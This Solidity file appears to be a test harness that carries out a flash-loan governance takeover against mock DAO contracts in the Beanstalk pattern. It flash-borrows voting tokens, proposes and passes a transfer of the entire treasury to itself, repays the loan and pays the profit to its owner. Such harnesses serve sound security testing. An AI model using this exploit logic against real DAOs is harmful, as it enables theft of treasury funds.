// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Token} from "../Token.sol";
import {FlashLender, IFlashBorrower} from "../FlashLender.sol";
import {DAOBase} from "../Governance.sol";

/// @title GovernanceAttacker — TEST HARNESS (T4): flash-loan governance takeover (Beanstalk pattern).
/// @notice Flash-borrow governance tokens → propose "send the treasury to me" → vote → execute → repay.
contract GovernanceAttacker is IFlashBorrower {
    address public immutable owner;
    FlashLender public immutable lender;

    constructor(FlashLender lender_) {
        owner = msg.sender;
        lender = lender_;
    }

    function attack(DAOBase dao, Token loot, uint256 flashAmount) external returns (uint256 profit) {
        require(msg.sender == owner, "GovAttacker: only owner");
        Token gov = dao.govToken();
        lender.flashLoan(this, address(gov), flashAmount, abi.encode(dao, loot));
        profit = loot.balanceOf(address(this));
        require(loot.transfer(owner, profit), "GovAttacker: payout");
        // the flash fee is paid in governance tokens bought beforehand; leftovers go to the owner
        uint256 leftover = gov.balanceOf(address(this));
        if (leftover > 0) gov.transfer(owner, leftover);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        require(msg.sender == address(lender) && initiator == address(this), "GovAttacker: untrusted");
        (DAOBase dao, Token loot) = abi.decode(data, (DAOBase, Token));
        uint256 treasury = loot.balanceOf(address(dao));
        uint256 id = dao.propose(address(loot), abi.encodeCall(Token.transfer, (address(this), treasury)));
        dao.vote(id);
        dao.execute(id);
        require(Token(token).balanceOf(address(this)) >= amount + fee, "GovAttacker: cannot repay");
        Token(token).approve(address(lender), amount + fee);
        return lender.CALLBACK_SUCCESS();
    }
}
